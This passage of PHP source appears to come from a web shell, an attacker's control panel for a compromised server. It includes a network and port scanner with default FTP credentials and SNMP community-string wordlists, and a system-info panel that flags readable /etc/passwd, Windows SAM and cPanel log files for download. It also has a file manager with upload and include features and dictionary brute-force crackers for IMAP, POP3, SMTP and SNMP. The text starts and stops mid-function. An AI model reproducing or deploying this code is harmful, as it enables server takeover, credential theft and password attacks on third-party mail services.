echo "<center><br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"50%\"><tr><form method=\"POST\"><td>Port scanner:</td></tr><td width=\"25%\" bgcolor=\"#808080\">Target:</td><td bgcolor=\"#808080\" width=80%><input name=target value=$host size=40></td></tr><tr><td bgcolor=\"#666666\" width=25%>From:</td><td bgcolor=\"#666666\" width=25%><input name=fromport type=text value=\"1\" size=5></td></tr><tr><td bgcolor=\"#808080\" width=25%>To:</td><td bgcolor=\"#808080\" width=25%><input name=toport type=text value=\"1024\" size=5></td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">Timeout:</td><td bgcolor=\"#666666\"><input name=timeout type=text value=\"2\" size=5></td><tr><td width=\"25%\" bgcolor=\"#808080\">$chbox</td><td bgcolor=\"#808080\" align=\"right\">$hcwd<input type=submit class=buttons name=portscanner value=Scan></td></tr></form></table>";
$host = substr($host,0,strrpos($host,"."));
echo "<br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"50%\"><tr><form method=\"POST\" name=security><td>security scanner:</td></tr><td width=\"25%\" bgcolor=\"#808080\">From:</td><td bgcolor=\"#808080\" width=80%><input name=from value=$host.1 size=40> <input type=checkbox value=1 style=\"border-width:1px;background-color:#808080;\" name=nslookup checked>NS lookup</td></tr><tr><td bgcolor=\"#666666\" width=25%>To:</td><td bgcolor=\"#666666\" width=25%>xxx.xxx.xxx.<input name=to type=text value=254 size=4>$hcwd</td></tr><tr><td width=\"25%\" bgcolor=\"#808080\">Timeout:</td><td bgcolor=\"#808080\"><input name=timeout type=text value=\"2\" size=5></td></tr><tr><td width=\"25%\" bgcolor=\"#666666\"><input type=checkbox name=ipscanner value=1 checked onClick=\"document.security.port.disabled = !document.security.port.disabled;\" style=\"border-width:1px;background-color:#666666;\">Port scanner:</td><td bgcolor=\"#666666\"><input name=port type=text value=\"21,23,25,80,110,135,139,143,443,445,1433,3306,3389,8080,65301\" size=60></td></tr><tr><td width=\"25%\" bgcolor=\"#808080\"><input type=checkbox name=httpbanner value=1 checked style=\"border-width:1px;background-color:#808080;\">Get web banner</td><td bgcolor=\"#808080\"><input type=checkbox name=httpscanner value=1 checked style=\"border-width:1px;background-color:#808080;\">Webserver security scanning&nbsp;&nbsp;&nbsp;<input type=checkbox name=smtprelay value=1 checked style=\"border-width:1px;background-color:#808080;\">SMTP relay check</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\"><input type=checkbox name=ftpscanner value=1 checked onClick=\"document.security.userpass.disabled = !document.security.userpass.disabled;\" style=\"border-width:1px;background-color:#666666;\">FTP password:</td><td bgcolor=\"#666666\"><input name=userpass type=text value=\"anonymous:admin@nasa.gov,ftp:ftp,Administrator:[BLANK],guest:[BLANK]\" size=60></td></tr><tr><td width=\"25%\" bgcolor=\"#808080\"><input type=checkbox name=snmpscanner value=1 onClick=\"document.security.com.disabled = !document.security.com.disabled;\" checked style=\"border-width:1px;background-color:#808080;\">SNMP:</td><td bgcolor=\"#808080\"><input name=com type=text value=\"public,private,secret,cisco,write,test,guest,ilmi,ILMI,password,all private,admin,all,system,monitor,agent,manager,OrigEquipMfr,default,tivoli,openview,community,snmp,snmpd,Secret C0de,security,rmon,rmon_admin,hp_admin,NoGaH$@!,agent_steal,freekevin,0392a0,cable-docsis,fubar,ANYCOM,Cisco router,xyzzy,c,cc,cascade,yellow,blue,internal,comcomcom,apc,TENmanUFactOryPOWER,proxy,core,regional\" size=60></td></tr><tr><td width=\"25%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=\"right\"><input type=submit class=buttons name=securityscanner value=Scan></td></tr></form></table></center><br><center>";
}
}
function sysinfO(){
global $windows,$disablefunctions,$safemode;
$cwd= getcwd();
$mil="<a target=\"_blank\" href=\"http://www.milw0rm.org/related.php?program=";
$basedir=(ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON":"OFF";
if (!empty($_SERVER["PROCESSOR_IDENTIFIER"])) $CPU = $_SERVER["PROCESSOR_IDENTIFIER"];
$osver=$tsize=$fsize='';
if ($windows){ 
$osver = "  (".shelL("ver").")";
$sysroot = shelL("echo %systemroot%");
if (empty($sysroot)) $sysroot = $_SERVER["SystemRoot"];
if (empty($sysroot)) $sysroot = getenv("windir");
if (empty($sysroot)) $sysroot = "Not Found";
if (empty($CPU))$CPU = shelL("echo %PROCESSOR_IDENTIFIER%");
for ($i=66;$i<=90;$i++){
$drive= chr($i).':\\';
if (is_dir($drive)){
$fsize+=@disk_free_space($drive);
$tsize+=@disk_total_space($drive);
}
}
}else{
$fsize=disk_free_space('/');
$tsize=disk_total_space('/');
}
$disksize="Used spase: ". showsizE($tsize-$fsize) . "   Free space: ". showsizE($fsize) . "   Total space: ". showsizE($tsize);
if (empty($CPU)) $CPU = "Unknow";
$os = php_unamE();
$osn=php_unamE('s');
if(!$windows){ 
$ker = php_unamE('r');
$o=($osn=="Linux")?"Linux+Kernel":$osn;
$os = str_replace($osn,"${mil}$o\">$osn</a>",$os);
$os = str_replace($ker,"${mil}Linux+Kernel\">$ker</a>",$os);
$inpa=':';
}else{
$sam = $sysroot."\\system32\\config\\SAM";
$inpa=';';
$os = str_replace($osn,"${mil}MS+Windows\">$osn</a>",$os);
}
$software=str_replace("Apache","${mil}Apache\">Apache</a>",$_SERVER['SERVER_SOFTWARE']);
echo "<table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"100%\"><tr><td>Server information:</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">Server:</td><td bgcolor=\"#666666\">".$_SERVER["HTTP_HOST"]; if (!empty($_SERVER["SERVER_ADDR"])){ echo "(". $_SERVER["SERVER_ADDR"] .")";}echo "</td></tr><tr><td width=\"25%\" bgcolor=\"#808080\">Operation system:</td><td bgcolor=\"#808080\">$os$osver</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">Web server application:</td><td bgcolor=\"#666666\">$software</td></tr><tr><td width=\"25%\" bgcolor=\"#808080\">CPU:</td><td bgcolor=\"#808080\">$CPU</td></tr><td width=\"25%\" bgcolor=\"#666666\">Disk status:</td><td bgcolor=\"#666666\">$disksize</td></tr><tr><td width=\"25%\" bgcolor=\"#808080\">User domain:</td><td bgcolor=\"#808080\">";if (!empty($_SERVER['USERDOMAIN'])) echo $_SERVER['USERDOMAIN'];else echo "Unknow"; echo "</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">User name:</td><td bgcolor=\"#666666\">";$cuser=get_current_user();if (!empty($cuser)) echo get_current_user();else echo "Unknow"; echo "</td></tr>";
if ($windows){
echo "<tr><td width=\"25%\" bgcolor=\"#808080\">Windows directory:</td><td bgcolor=\"#808080\"><a href=\"".hlinK("seC=fm&workingdiR=$sysroot")."\">$sysroot</a></td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">Sam file:</td><td bgcolor=\"#666666\">";if (is_readable(($sam)))echo "<a href=\"".hlinK("?workingdiR=$sysroot\\system32\\config&downloaD=sam")."\">Readable</a>"; else echo "Not readable";echo "</td></tr>";
}
else
{
echo "<tr><td width=\"25%\" bgcolor=\"#808080\">Passwd file:</td><td bgcolor=\"#808080\">";
if (is_readable('/etc/passwd')) echo "<a href=\"".hlinK("seC=edit&filE=/etc/passwd&workingdiR=$cwd")."\">Readable</a>"; else echo'Not readable';echo "</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">Cpanel log file:</td><td bgcolor=\"#666666\">";
if (file_exists("/var/cpanel/accounting.log")){if (is_readable("/var/cpanel/accounting.log")) echo "<a href=\"".hlinK("seC=edit&filE=/var/cpanel/accounting.log&workingdiR=$cwd")."\">Readable</a>"; else echo "Not readable";}else echo "Not found";
echo "</td></tr>";
}
$uip =(!empty($_SERVER['REMOTE_ADDR']))?$_SERVER['REMOTE_ADDR']:getenv('REMOTE_ADDR');
echo "<tr><td width=\"25%\" bgcolor=\"#808080\">${mil}PHP\">PHP</a> version:</td><td bgcolor=\"#808080\"><a href=\"?=".php_logo_guid()."\" target=\"_blank\">".PHP_VERSION."</a> (<a href=\"".hlinK("seC=phpinfo&workingdiR=$cwd")."\">more...</a>)</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">Zend version:</td><td bgcolor=\"#666666\">";if (function_exists('zend_version')) echo "<a href=\"?=".zend_logo_guid()."\" target=\"_blank\">".zend_version()."</a>";else echo "Not Found";echo "</td><tr><td width=\"25%\" bgcolor=\"#808080\">Include path:</td><td bgcolor=\"#808080\">".str_replace($inpa," ",DEFAULT_INCLUDE_PATH)."</td><tr><td width=\"25%\" bgcolor=\"#666666\">PHP Modules:</td><td bgcolor=\"#666666\">";$ext=get_loaded_extensions();foreach($ext as $v)echo $v." ";echo "</td><tr><td width=\"25%\" bgcolor=\"#808080\">Disabled functions:</td><td bgcolor=\"#808080\">";if(!empty($disablefunctions))echo $disablefunctions;else echo "Nothing"; echo"</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">Safe mode:</td><td bgcolor=\"#666666\">$safemode</td></tr><tr><td width=\"25%\" bgcolor=\"#808080\">Open base dir:</td><td bgcolor=\"#808080\">$basedir</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">DBMS:</td><td bgcolor=\"#666666\">";$sq="";if(function_exists('mysql_connect')) $sq= "${mil}MySQL\">MySQL</a> ";if(function_exists('mssql_connect')) $sq.= " ${mil}MSSQL\">MSSQL</a> ";if(function_exists('ora_logon')) $sq.= " ${mil}Oracle\">Oracle</a> ";if(function_exists('sqlite_open')) $sq.= " SQLite ";if(function_exists('pg_connect')) $sq.= " ${mil}PostgreSQL\">PostgreSQL</a> ";if(function_exists('msql_connect')) $sq.= " mSQL ";if(function_exists('mysqli_connect'))$sq.= " MySQLi ";if(function_exists('ovrimos_connect')) $sq.= " Ovrimos SQL ";if ($sq=="") $sq= "Nothing"; echo "$sq</td></tr>";if (function_exists('curl_init')) echo "<tr><td width=\"25%\" bgcolor=\"#808080\">cURL support:</td><td bgcolor=\"#808080\">Enabled ";if(function_exists('curl_version')){$ver=curl_version();echo "(Version:". $ver['version']." OpenSSL version:". $ver['ssl_version']." zlib version:". $ver['libz_version']." host:". $ver['host'] .")";}echo "</td></tr>";echo "<tr><td>User information:</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">IP:</td><td bgcolor=\"#666666\">$uip</td></tr><tr><td width=\"25%\" bgcolor=\"#808080\">Agent:</td><td bgcolor=\"#808080\">".getenv('HTTP_USER_AGENT')."</td></tr></table>";
}
function checksuM($file){
global $et;
echo "<table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"><tr><td width=\"10%\" bgcolor=\"#666666\"><b>MD5:</b> <font color=#F0F0F0>".md5_file($file)."</font><br><b>SHA1:</b> <font color=#F0F0F0>".sha1_file($file)."</font>$et";
}
function listdiR($cwd,$task){
$c= getcwd();
$dh = opendir($cwd);
while ($cont=readdir($dh)){
if($cont=='.' || $cont=='..')continue;
$adr = $cwd.DIRECTORY_SEPARATOR.$cont;
switch ($task){
case '0':if(is_file($adr))echo "[<a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\">$adr</a>]\n";if(is_dir($adr))echo "[<a href=\"".hlinK("seC=fm&workingdiR=$adr")."\">$adr</a>]\n";break;
case '1':if(is_writeable($adr))if(is_file($adr))echo "[<a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\">$adr</a>]\n";if(is_dir($adr))echo "[<a href=\"".hlinK("seC=fm&workingdiR=$adr")."\">$adr</a>]\n";break;
case '2':if(is_file($adr) &&  is_writeable($adr))echo "[<a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\">$adr</a>]\n";break;
case '3':if(is_dir($adr) && is_writeable($adr))echo "[<a href=\"".hlinK("seC=fm&workingdiR=$adr")."\">$adr</a>]\n";break;
case '4':if(is_file($adr))echo "[<a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\">$adr</a>]\n";break;
case '5':if(is_dir($adr))echo "[<a href=\"".hlinK("seC=fm&workingdiR=$adr")."\">$adr</a>]\n";break;
case '6':if(preg_match("@".$_REQUEST['search']."@",$cont)){if(is_file($adr))echo "[<a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\">$adr</a>]\n";if(is_dir($adr))echo "[<a href=\"".hlinK("seC=fm&workingdiR=$adr")."\">$adr</a>]\n";}break;
case '7':if(strstr($cont,$_REQUEST['search'])){if(is_file($adr))echo "[<a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\">$adr</a>]\n";if(is_dir($adr))echo "[<a href=\"".hlinK("seC=fm&workingdiR=$adr")."\">$adr</a>]\n";}break;
}
if (is_dir($adr)) listdiR($adr,$_REQUEST['task']);
}
}
if (!function_exists("posix_getpwuid") && !strstr($disablefunctions,'posix_getpwuid')) {function posix_getpwuid($u) {return 0;}}
if (!function_exists("posix_getgrgid") && !strstr($disablefunctions,'posix_getgrgid')) {function posix_getgrgid($g) {return 0;}}
function filemanager(){
global $windows,$msgbox,$errorbox,$t,$et,$hcwd;
$cwd= getcwd();
$table = "<table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"100%\">";
$td1n="<td width=\"22%\" bgcolor=\"#666666\">";
$td2m="<td width=\"22%\" bgcolor=\"#808080\">";
$td1i="<td width=\"5%\" bgcolor=\"#666666\">";
$td2i="<td width=\"5%\" bgcolor=\"#808080\">";
$tdnr="<td width=\"22%\" bgcolor=\"#800000\">";
$tdw="<td width=\"22%\" bgcolor=\"#006E00\">";
if (!empty($_REQUEST['task'])){
if (!empty($_REQUEST['search'])) $_REQUEST['task'] = 7;
if (!empty($_REQUEST['re'])) $_REQUEST['task'] = 6;
echo "<font color=blue><pre>";
listdiR($cwd,$_REQUEST['task']);
echo "</pre></font>";
}else{
if (!empty($_REQUEST['cP']) || !empty($_REQUEST['mV'])|| !empty($_REQUEST['rN'])){
if (!empty($_REQUEST['cP']) || !empty($_REQUEST['mV'])){
$title="Destination";
$ad = (!empty($_REQUEST['cP']))?$_REQUEST['cP']:$_REQUEST['mV'];
$dis =(!empty($_REQUEST['cP']))?'Copy':'Move';
}else{
$ad = $_REQUEST['rN'];
$title ="New name";
$dis = "Rename";
}
if (!!empty($_REQUEST['deS'])){
echo "<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"><tr><td width=\"100%\" bgcolor=\"#333333\">$title:</td></tr><tr>$td1n<form method=\"POST\"><input type=text value=\"";if(empty($_REQUEST['rN'])) echo $cwd; echo "\" size=60 name=deS></td></tr><tr>$td2m$hcwd<input type=hidden value=\"".htmlspecialchars($ad)."\" name=cp><input class=buttons type=submit value=$dis></td></tr></form></table></center>";
}else{
if (!empty($_REQUEST['rN'])) renamE($ad,$_REQUEST['deS']);
else{
copy($ad,$_REQUEST['deS']);
if (!empty($_REQUEST['mV']))unlink($ad);
}
}
}
if (!empty($_REQUEST['deL'])) { if (is_file($_REQUEST['deL'])|| is_link($_REQUEST['deL'])) unlink($_REQUEST['deL']);elseif(is_dir($_REQUEST['deL'])) {
$dh = opendir($_REQUEST['deL']);
$d="";
while ($cont=readdir($dh)){$d++;}
if ($d>2) echo "$errorbox\"".htmlspecialchars($_REQUEST['del'])."\" is not empty!<td><tr></table><br>";else rmdir($_REQUEST['del']);}}
if (!empty($_FILES['uploadfile'])){
move_uploaded_file($_FILES['uploadfile']['tmp_name'],$_FILES['uploadfile']['name']);
echo "$msgbox<b>Uploaded!</b> File name: ".$_FILES['uploadfile']['name']." File size: ".$_FILES['uploadfile']['size']. "$et<br>";
}
$select = "<select onChange=\"window.location=this.options[this.selectedIndex].value;\"><option value=\"".hlinK("seC=fm&workingdiR=$cwd")."\">--------</option><option value=\"";
if (!empty($_REQUEST['newf'])){
if (!empty($_REQUEST['newfile'])){file_put_contents($_REQUEST['newf'],"");}
if (!empty($_REQUEST['newdir'])){mkdir($_REQUEST['newf']);}
}
if ($windows){
echo "$table<td><b>Drives:</b> ";
for ($i=66;$i<=90;$i++){$drive= chr($i).':';
if (is_dir($drive."\\")){$vol=shelL("vol $drive");if(empty($vol))$vol=$drive;echo " <a title=\"$vol\" href=".hlinK("seC=fm&workingdiR=$drive\\").">$drive\\</a>";}
}
echo $et;
}
echo "$table<form method=\"POST\"><tr><td width=\"20%\"><b>Location:</b><input type=text name=workingdiR size=135 value=\"".getcwd()."\"><input class=buttons type=submit value=Change></td></tr></form></table>";
$file=array();$dir=array();$link=array();
if($dirhandle = opendir($cwd)){
while ($cont=readdir($dirhandle)){
if (is_dir($cwd.DIRECTORY_SEPARATOR.$cont)) $dir[]= $cont;
elseif (is_file($cwd.DIRECTORY_SEPARATOR.$cont)) $file[]=$cont;
else $link[]=$cont;
}
closedir($dirhandle);
sort($file);sort($dir);sort($link);
echo "<table border=1 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"100%\"><tr><td width=\"30%\" bgcolor=\"#333333\" align=\"center\">Name</td><td width=\"13%\" bgcolor=\"#333333\" align=\"center\">Owner</td><td width=\"12%\" bgcolor=\"#333333\" align=\"center\">Modification time</td><td width=\"12%\" bgcolor=\"#333333\" align=\"center\">Last change</td><td width=\"5%\" bgcolor=\"#333333\" align=\"center\">Info</td><td width=\"7%\" bgcolor=\"#333333\" align=\"center\">Size</td><td width=\"15%\" bgcolor=\"#333333\" align=\"center\">Actions</td></tr>";
$i=0;
foreach($dir as $dn){
echo "<tr>";
$i++;
$own="Unknow";
$owner=posix_getpwuid(fileowner($dn));
$mdate=date("Y/m/d H:i:s",filemtime($dn));
$adate=date("Y/m/d H:i:s",fileatime($dn));
$diraction = $select.hlinK("seC=fm&workingdiR=".realpath($dn))."\">Open</option><option value=\"".hlinK("seC=fm&workingdiR=$cwd&rN=$dn")."\">Rename</option><option value=\"".hlinK("seC=fm&deL=$dn&workingdiR=$cwd")."\">Remove</option></select></td>";
if ($owner) $own = "<a title=\" Shell: ".$owner['shell']."\" href=\"".hlinK("seC=fm&workingdiR=".$owner['dir'])."\">".$owner['name']."</a>";
if (($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}
if (is_writeable($dn)) echo $tdw;elseif (!is_readable($dn)) echo $tdnr;else echo $cl2;
echo "<a href=\"".hlinK("seC=fm&workingdiR=".realpath($dn))."\">";
if (strlen($dn)>45)echo substr($dn,0,42)."...";else echo $dn;echo "</a>";
echo $cl1."$own</td>";
echo $cl1."$mdate</td>";
echo $cl1."$adate</td>";
echo "</td>${cl1}D";if (is_readable($dn)) echo "R";if (is_writeable($dn)) echo "W";echo "</td>";
echo "$cl1------</td>";
echo $cl2.$diraction;
echo "</tr>" ;
flusheR();
}
foreach($file as $fn){
echo "<tr>";
$i++;
$own = "Unknow";
$owner = posix_getpwuid(fileowner($fn));
$fileaction=$select.hlinK("seC=openit&namE=$fn&workingdiR=$cwd")."\">Open</option><option value=\"".hlinK("seC=edit&filE=$fn&workingdiR=$cwd")."\">Edit</option><option value=\"".hlinK("seC=fm&downloaD=$fn&workingdiR=$cwd")."\">Download</option><option value=\"".hlinK("seC=hex&filE=$fn&workingdiR=$cwd")."\">Hex view</option><option value=\"".hlinK("seC=img&filE=$fn&workingdiR=$cwd")."\">image</option><option value=\"".hlinK("seC=inc&filE=$fn&workingdiR=$cwd")."\">Include</option><option value=\"".hlinK("seC=checksum&filE=$fn&workingdiR=$cwd")."\">Checksum</option><option value=\"".hlinK("seC=fm&workingdiR=$cwd&cP=$fn")."\">Copy</option><option value=\"".hlinK("seC=fm&workingdiR=$cwd&mV=$fn")."\">Move</option><option value=\"".hlinK("seC=fm&workingdiR=$cwd&rN=$fn")."\">Rename</option><option value=\"".hlinK("seC=fm&deL=$fn&workingdiR=$cwd")."\">Remove</option></select></td>";
$mdate = date("Y/m/d H:i:s",filemtime($fn));
$adate = date("Y/m/d H:i:s",fileatime($fn));
if ($owner) $own = "<a title=\"Shell:".$owner['shell']."\" href=\"".hlinK("seC=fm&workingdiR=".$owner['dir'])."\">".$owner['name']."</a>";
$size = showsizE(filesize($fn));
if (($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}
if (is_writeable($fn)) echo $tdw;elseif (!is_readable($fn)) echo $tdnr;else echo $cl2;
echo "<a href=\"".hlinK("seC=openit&namE=$fn&workingdiR=$cwd")."\">";
if (strlen($fn)>45)echo substr($fn,0,42)."...";else echo $fn;echo "</a>";
echo $cl1."$own</td>";
echo $cl1."$mdate</td>";
echo $cl1."$adate</td>";
echo "</td>$cl1";if (is_readable($fn)) echo "R";if (is_writeable($fn)) echo "W";if (is_executable($fn)) echo "X";if (is_uploaded_file($fn)) echo "U"; echo "</td>";
echo "$cl1$size</td>";
echo $td2m.$fileaction;
echo "</tr>" ;
flusheR();
}
foreach($link as $ln){
$own = "Unknow";
$i++;
$owner = posix_getpwuid(fileowner($ln));
$linkaction=$select.hlinK("seC=openit&namE=$ln&workingdiR=$ln")."\">Open</option><option value=\"".hlinK("seC=edit&filE=$ln&workingdiR=$cwd")."\">Edit</option><option value=\"".hlinK("seC=fm&downloaD=$ln&workingdiR=$cwd")."\">Download</option><option value=\"".hlinK("seC=hex&filE=$ln&workingdiR=$cwd")."\">Hex view</option><option value=\"".hlinK("seC=img&filE=$ln&workingdiR=$cwd")."\">image</option><option value=\"".hlinK("seC=inc&filE=$ln&workingdiR=$cwd")."\">Include</option><option value=\"".hlinK("seC=checksum&filE=$ln&workingdiR=$cwd")."\">Checksum</option><option value=\"".hlinK("seC=fm&workingdiR=$cwd&cP=$ln")."\">Copy</option><option value=\"".hlinK("seC=fm&workingdiR=$cwd&mV=$ln")."\">Move</option><option value=\"".hlinK("seC=fm&workingdiR=$cwd&rN=$ln")."\">Rename</option><option value=\"".hlinK("seC=fm&deL=$ln&workingdiR=$cwd")."\">Remove</option></select></td>";
$mdate = date("Y/m/d H:i:s",filemtime($ln));
$adate = date("Y/m/d H:i:s",fileatime($ln));
if ($owner) $own = "<a title=\"Shell: ".$owner['shell']."\" href=\"".hlinK("seC=fm&workingdiR=".$owner['dir'])."\">".$owner['name']."</a>";
echo "<tr>";
$size = showsizE(filesize($ln));
if (($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}
if (is_writeable($ln)) echo $tdw;elseif (!is_readable($ln)) echo $tdnr;else echo $cl2;
echo "<a href=\"".hlinK("seC=openit&namE=$ln&workingdiR=$cwd")."\">";
if (strlen($ln)>45)echo substr($ln,0,42)."...";else echo $ln;echo "</a>";
echo $cl1."$own</td>";
echo $cl1."$mdate</td>";
echo $cl1."$adate</td>";
echo "</td>${cl1}L";if (is_readable($ln)) echo "R";if (is_writeable($ln)) echo "W";if (is_executable($ln)) echo "X"; echo "</td>";
echo "$cl1$size</td>";
echo $cl2.$linkaction;
echo "</tr>" ;
flusheR();
}
}
$dc = count($dir)-2;
if($dc==-2)$dc=0;
$fc = count($file);
$lc = count($link);
$total = $dc + $fc + $lc;
echo "$table<tr><td><form method=POST>Find:<input type=text name=search><input type=checkbox name=re value=1 style=\"border-width:1px;background-color:#333333;\" checked>Regular expressions <input type=submit class=buttons value=Find>$hcwd<input type=hidden value=7 name=task></form></td><td><form method=POST>$hcwd<input type=hidden value=\"fm\" name=seC><select name=task><option value=0>Display files and directories in current folder</option><option value=1>Find writable files and directories in current folder</option><option value=2>Find writable files in current folder</option><option value=3>Find writable directories in current folder</option><option value=4>Display all files in current folder</option><option value=5>Display all directories in current folder</option></select><input type=submit class=buttons value=Do></form>$et</tr></table><table width=\"100%\"><tr><td width=\"50%\"><br><table bgcolor=#333333 border=0 width=\"65%\"><td><b>Summery:</b>   Total: $total Directories: $dc Files: $fc Links: $lc</td></table><table bgcolor=#333333 border=0 width=\"65%\"><td width=\"100%\" bgcolor=";if (is_writeable($cwd)) echo "#006E00";elseif (!is_readable($cwd)) echo "#800000";else "#333333"; echo ">Current directory status: "; if (is_readable($cwd)) echo "R";if (is_writeable($cwd)) echo "W" ;echo "</td></table><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"65%\"><tr><td width=\"100%\" bgcolor=\"#333333\">New:</td></tr><tr>$td1n<form method=\"POST\"><input type=text size=47 name=newf></td></tr><tr>$td2m$hcwd<input class=buttons type=submit name=newfile value=\"File\"><input class=buttons type=submit name=newdir value=\"Folder\"></td></tr></form></table></td><td width=\"50%\"><br>${t}Upload:</td></tr><tr>$td1n<form method=\"POST\" enctype=\"multipart/form-data\"><input type=file size=45 name=uploadfile></td></tr><tr>$td2m$hcwd<input class=buttons type=submit value=Upload></td></tr>$td1n Note: Max allowed file size to upload on this server is ".ini_get('upload_max_filesize')."</td></tr></form></table>$et";
}
}
function imaplogiN($host,$username,$password){
$sock=fsockopen($host,143,$n,$s,5);
$b=namE();
$l=strlen($b);
if(!$sock)return -1;
fread($sock,1024);
fputs($sock,"$b LOGIN $username $password\r\n");
$res=fgets($sock,$l+4);
if ($res == "$b OK")return 1;else return 0;
fclose($sock);
}
function pop3logiN($server,$user,$pass){
$sock=fsockopen($server,110,$en,$es,5);
if(!$sock)return -1;
fread($sock,1024);
fwrite($sock,"user $user\n");
$r=fgets($sock);
if($r{0}=='-')return 0;
fwrite($sock,"pass $pass\n");
$r=fgets($sock);
fclose($sock);
if($r{0}=='+')return 1;
return 0;
}
function imapcrackeR(){
global $t,$et,$errorbox,$crack;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "<font color=blue>Cracking ".htmlspecialchars($target)."...<br>";flusheR();
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$imap=imaplogiN($target,$user,$pass);
if($imap==-1){echo "$errorbox Can not connect to server.$et";break;}else{
if ($imap){echo "U: $user P: $pass<br>";if(!$type)break;}}
flusheR();
}
echo "<br>Done</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}else echo "<center>${t}IMAP cracker:$crack";
}
function snmpcrackeR(){
global $t,$et,$errorbox,$crack,$hcwd;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "<font color=blue>Cracking ".htmlspecialchars($target)."...<br>";flusheR();
while(!feof($dictionary)){
$com=trim(fgets($dictionary)," \n\r");
$res=snmpchecK($target,$com,2);
if($res)echo "$com<br>";
flusheR();
}
echo "<br>Done</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}else echo "<center>${t}SNMP cracker:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\">$hcwd<tr><td width=\"20%\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\"><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Server:</td><td bgcolor=\"#808080\"><input type=text name=target size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right><input class=buttons type=submit value=Start></td></tr></form></table></center>";
}
function pop3crackeR(){
global $t,$et,$errorbox,$crack;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "<font color=blue>Cracking ".htmlspecialchars($target)."...<br>";flusheR();
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$pop3=pop3logiN($target,$user,$pass);
if($pop3==-1){echo "$errorbox Can not connect to server.$et";break;} else{
if ($pop3){echo "U: $user P: $pass<br>";if(!$type)break;}}
flusheR();
}
echo "<br>Done</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}else echo "<center>${t}POP3 cracker:$crack";
}
function smtpcrackeR(){
global $t,$et,$errorbox,$crack;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "<font color=blue>Cracking ".htmlspecialchars($target)."...<br>";flusheR();
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$smtp=smtplogiN($target,$user,$pass,5);
if($smtp==-1){echo "$errorbox Can not connect to server.$et";break;} else{
if ($smtp){echo "U: $user P: $pass<br>";if(!$type)break;}}
flusheR();
}
echo "<br>Done</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}else echo "<center>${t}SMTP cracker:$crack";
}
function formcrackeR(){
